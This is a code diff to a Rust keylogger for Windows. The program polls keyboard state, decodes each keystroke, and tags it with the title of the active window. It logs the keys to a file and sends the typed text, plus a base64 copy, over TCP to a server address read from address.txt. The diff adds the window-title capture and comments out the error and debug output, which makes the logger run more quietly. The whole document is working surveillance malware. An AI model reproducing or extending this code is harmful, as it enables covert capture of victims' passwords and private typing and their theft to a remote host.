@@ -1,14 +1,14 @@
+use base64;
 use device_query::{DeviceQuery, DeviceState, Keycode};
+use std::convert::TryFrom;
+use std::fs::OpenOptions;
+use std::io::{Read, Write};
+use std::net::TcpStream;
 use std::sync::mpsc::channel;
 use std::sync::Arc;
 use std::sync::Mutex;
 use std::thread;
 use std::time::Duration;
-use std::io::{Read, Write};
-use base64;
-use std::convert::TryFrom;
-use std::fs::OpenOptions;
-use std::net::TcpStream;
 use windows::core::Result;
 use windows::core::PWSTR;
 use windows::Win32::System::Threading::GetCurrentThreadId;
@@ -16,25 +16,29 @@ use windows::Win32::UI::Input::KeyboardAndMouse::ToUnicodeEx;
 use windows::Win32::UI::Input::KeyboardAndMouse::{
     GetAsyncKeyState, GetKeyState, GetKeyboardLayout, GetKeyboardState, ToUnicode,
 };
-use windows::Win32::UI::WindowsAndMessaging::{GetForegroundWindow, GetWindowThreadProcessId};
+use windows::Win32::UI::WindowsAndMessaging::{
+    GetForegroundWindow, GetWindowTextW, GetWindowThreadProcessId,
+};
 
 // Key represents a single key entered by the user
 #[derive(Debug, Clone)]
 struct Key {
-    empty: bool,        // Indicates if a key is pressed or not
-    rune: Option<char>, // The character representation of the key
-    keycode: i32,       // The keycode of the key
+    keycode: i32,         // The keycode of the key
+    char: Option<char>,   // Unicode character of the key
+    is_control: bool,     // Is the key a control key (e.g. shift, ctrl, alt, etc.)
+    window_title: String, // The title of the window that was active when the key was pressed
 }
 
-impl Key {
+/*impl Key {
     fn new() -> Self {
         Self {
-            empty: true,
-            rune: None,
+            is_control: true,
+            char: None,
             keycode: 0,
         }
     }
 }
+*/
 
 fn main() {
     let (tx1, rx1) = channel::<Key>();
@@ -59,21 +63,6 @@ fn main() {
             writeln!(file, "{:?}", received).unwrap();
         }
     });
-    // for received in rx1 {
-    //     println!("Thread 1: Received {:?}", received);
-    // }
-
-    // let h3 = thread::spawn(move || {
-    //     let mut pressed_full = OpenOptions::new()
-    //         .create(true)
-    //         .write(true)
-    //         .append(true)
-    //         .open("pressed_full.txt")
-    //         .unwrap();
-    //     for received in rx2 {
-    //         println!("Thread 2: Received {:?}", received);
-    //     }
-    // });
 
     let h3 = thread::spawn({
         let keys1 = Arc::clone(&keys1);
@@ -89,7 +78,7 @@ fn main() {
             {
                 let mut keys1 = keys1.lock().unwrap();
                 for key in keys1.drain(..) {
-                    if let Some(r) = key.rune {
+                    if let Some(r) = key.char {
                         keys_string.push(r);
                     }
                 }
@@ -107,9 +96,9 @@ fn main() {
                         let mut stream = s;
                         writeln!(stream, "{}", keys_string).unwrap();
                         writeln!(stream, "{}", keys_base64).unwrap();
-                    },
+                    }
                     Err(e) => {
-                        println!("Error connecting to server: {}", e);
+                        // println!("Error connecting to server: {}", e);
                         continue;
                     }
                 }
@@ -130,12 +119,8 @@ fn main() {
             keys1.push(next_key.clone());
         }
 
-        println!("next: {:?}", next_key);
+        // println!("next: {:?}", next_key);
     }
-
-    // h1.join().unwrap();
-    h2.join().unwrap();
-    h3.join().unwrap();
 }
 
 // Get TCP address from the ./address.txt file if it exists other wise return the default address
@@ -195,9 +180,24 @@ fn get_next() -> Key {
     // println!("typeing {}: {} kb: {:?}", i, code, layout);
     // println!(">>> buff {:?}",  pwszbuff);
 
-    let mut key = Key::new();
-    key.empty = false;
-    key.keycode = next;
+    // Add the code to get the window title
+    let mut window_title = vec![0u16; 1024]; // Create a buffer for the window title
+    let title_length = unsafe { GetWindowTextW(foreground_window, &mut window_title) };
+    window_title.resize(title_length as usize, 0); // Resize the vector to fit the title
+    let window_title = String::from_utf16(&window_title).unwrap_or_default(); // Convert the title to a String
+
+    // println!("Window title: {}", window_title); // Print the window title
+
+    // let mut key = Key::new();
+    // key.is_control = false;
+    // key.keycode = next;
+
+    let mut key = Key {
+        keycode: next,
+        char: None,
+        is_control: false,
+        window_title,
+    };
 
     // let code_point: u32 = 1567; ///ssssfqwewerdfgrtasd
     let code_point: u32 = pwszbuff[0] as u32;
@@ -205,15 +205,15 @@ fn get_next() -> Key {
         // let character = character.to_string();
         if character.is_control() {
             // println!("{} is a control character", code_point);
-            key.empty = true;
+            key.is_control = true;
         } else {
-            key.rune = Some(character);
+            key.char = Some(character);
             let character_string = character.to_string();
             // println!("{}", character_string);
         }
         // println!(">>> {}", character_string);
     } else {
-        key.empty = true;
+        key.is_control = true;
         // println!("Invalid Unicode code point: {}", code_point);
     };
 
@@ -257,6 +257,249 @@ fn get_main_key_codes() -> Vec<i32> {
 }
 
 fn is_known_win_key(win_key1: i32) -> bool {
+    use std::collections::HashSet;
+    use windows::Win32::UI::Input::KeyboardAndMouse::*;
+
+    let known_keys: HashSet<VIRTUAL_KEY> = [
+        VK_LBUTTON,
+        VK_RBUTTON,
+        VK_CANCEL,
+        VK_MBUTTON,
+        VK_XBUTTON1,
+        VK_XBUTTON2,
+        VK_BACK,
+        VK_TAB,
+        VK_CLEAR,
+        VK_RETURN,
+        VK_SHIFT,
+        VK_CONTROL,
+        VK_MENU,
+        VK_PAUSE,
+        VK_CAPITAL,
+        VK_KANA,
+        VK_HANGUEL,
+        VK_HANGUL,
+        VK_IME_ON,
+        VK_JUNJA,
+        VK_FINAL,
+        VK_HANJA,
+        VK_KANJI,
+        VK_IME_OFF,
+        VK_ESCAPE,
+        VK_CONVERT,
+        VK_NONCONVERT,
+        VK_ACCEPT,
+        VK_MODECHANGE,
+        VK_SPACE,
+        VK_PRIOR,
+        VK_NEXT,
+        VK_END,
+        VK_HOME,
+        VK_LEFT,
+        VK_UP,
+        VK_RIGHT,
+        VK_DOWN,
+        VK_SELECT,
+        VK_PRINT,
+        VK_EXECUTE,
+        VK_SNAPSHOT,
+        VK_INSERT,
+        VK_DELETE,
+        VK_HELP,
+        // // Keys '0' to '9'
+        // 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
+        // // Keys 'A' to 'Z'
+        // 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
+        // 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52,
+        // 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5A,
+        VK_LWIN,
+        VK_RWIN,
+        VK_APPS,
+        VK_SLEEP,
+        VK_NUMPAD0,
+        VK_NUMPAD1,
+        VK_NUMPAD2,
+        VK_NUMPAD3,
+        VK_NUMPAD4,
+        VK_NUMPAD5,
+        VK_NUMPAD6,
+        VK_NUMPAD7,
+        VK_NUMPAD8,
+        VK_NUMPAD9,
+        VK_MULTIPLY,
+        VK_ADD,
+        VK_SEPARATOR,
+        VK_SUBTRACT,
+        VK_DECIMAL,
+        VK_DIVIDE,
+        VK_F1,
+        VK_F2,
+        VK_F3,
+        VK_F4,
+        VK_F5,
+        VK_F6,
+        VK_F7,
+        VK_F8,
+        VK_F9,
+        VK_F10,
+        VK_F11,
+        VK_F12,
+        VK_F13,
+        VK_F14,
+        VK_F15,
+        VK_F16,
+        VK_F17,
+        VK_F18,
+        VK_F19,
+        VK_F20,
+        VK_F21,
+        VK_F22,
+        VK_F23,
+        VK_F24,
+        VK_NUMLOCK,
+        VK_SCROLL,
+        VK_LSHIFT,
+        VK_RSHIFT,
+        VK_LCONTROL,
+        VK_RCONTROL,
+        VK_LMENU,
+        VK_RMENU,
+        VK_BROWSER_BACK,
+        VK_BROWSER_FORWARD,
+        VK_BROWSER_REFRESH,
+        VK_BROWSER_STOP,
+        VK_BROWSER_SEARCH,
+        VK_BROWSER_FAVORITES,
+        VK_BROWSER_HOME,
+        VK_VOLUME_MUTE,
+        VK_VOLUME_DOWN,
+        VK_VOLUME_UP,
+        VK_MEDIA_NEXT_TRACK,
+        VK_MEDIA_PREV_TRACK,
+        VK_MEDIA_STOP,
+        VK_MEDIA_PLAY_PAUSE,
+        VK_LAUNCH_MAIL,
+        VK_LAUNCH_MEDIA_SELECT,
+        VK_LAUNCH_APP1,
+        VK_LAUNCH_APP2,
+        VK_OEM_1,
+        VK_OEM_PLUS,
+        VK_OEM_COMMA,
+        VK_OEM_MINUS,
+        VK_OEM_PERIOD,
+        VK_OEM_2,
+        VK_OEM_3,
+        VK_OEM_4,
+        VK_OEM_5,
+        VK_OEM_6,
+        VK_OEM_7,
+        VK_OEM_8,
+        VK_OEM_102,
+        VK_PROCESSKEY,
+        VK_PACKET,
+        VK_ATTN,
+        VK_CRSEL,
+        VK_EXSEL,
+        VK_EREOF,
+        VK_PLAY,
+        VK_ZOOM,
+        VK_NONAME,
+        VK_PA1,
+        VK_OEM_CLEAR,
+    ]
+    .iter()
+    .copied()
+    .collect();
+    let vk = VIRTUAL_KEY(win_key1 as u16);
+    let control = known_keys.contains(&vk);
+    if !control {
+        return true;
+    }
+
+    let win_key = win_key1 as u8;
+    match win_key as char {
+        '0'..='9' | 'A'..='Z' => true,
+        _ => false,
+    }
+}
+
+fn is_known_win_key_bk3(win_key1: i32) -> bool {
+    use std::collections::HashSet;
+    use windows::Win32::UI::Input::KeyboardAndMouse::*;
+
+    let known_keys: HashSet<VIRTUAL_KEY> = [
+        // Function keys
+        VK_F1,
+        VK_F2,
+        VK_F3,
+        VK_F4,
+        VK_F5,
+        VK_F6,
+        VK_F7,
+        VK_F8,
+        VK_F9,
+        VK_F10,
+        VK_F11,
+        VK_F12,
+        // Number keys '0' to '9'
+        // (b'0' as u16)..=(b'9' as u16),
+
+        // Alphabet keys 'A' to 'Z'
+        // (b'A' as u16)..=(b'Z' as u16),
+
+        // Other keys
+        VK_ADD,
+        VK_SUBTRACT,
+        VK_DIVIDE,
+        VK_MULTIPLY,
+        VK_SPACE,
+        VK_LCONTROL,
+        VK_RCONTROL,
+        VK_LSHIFT,
+        VK_RSHIFT,
+        VK_LMENU,
+        VK_RMENU,
+        VK_LWIN,
+        VK_RWIN,
+        VK_RETURN,
+        VK_ESCAPE,
+        VK_UP,
+        VK_DOWN,
+        VK_LEFT,
+        VK_RIGHT,
+        VK_BACK,
+        VK_CAPITAL,
+        VK_TAB,
+        VK_HOME,
+        VK_END,
+        VK_PRIOR,
+        VK_NEXT,
+        VK_INSERT,
+        VK_DELETE,
+        VK_OEM_3,
+        VK_OEM_MINUS,
+        VK_OEM_PLUS,
+        VK_OEM_4,
+        VK_OEM_6,
+        VK_OEM_5,
+        VK_OEM_1,
+        VK_OEM_7,
+        VK_OEM_COMMA,
+        VK_OEM_PERIOD,
+        VK_OEM_2,
+    ]
+    .iter()
+    .cloned()
+    .flatten()
+    .map(VIRTUAL_KEY)
+    .collect();
+
+    let win_key = VIRTUAL_KEY(win_key1 as u16);
+
+    known_keys.contains(&win_key)
+}
+
+fn is_known_win_key_2(win_key1: i32) -> bool {
     use windows::Win32::UI::Input::KeyboardAndMouse::*;
     let win_key = VIRTUAL_KEY(win_key1 as u16);
     match win_key {
@@ -331,7 +574,6 @@ fn is_known_win_key(win_key1: i32) -> bool {
         }
     }
 }
-
 
 ///// bk ///
 
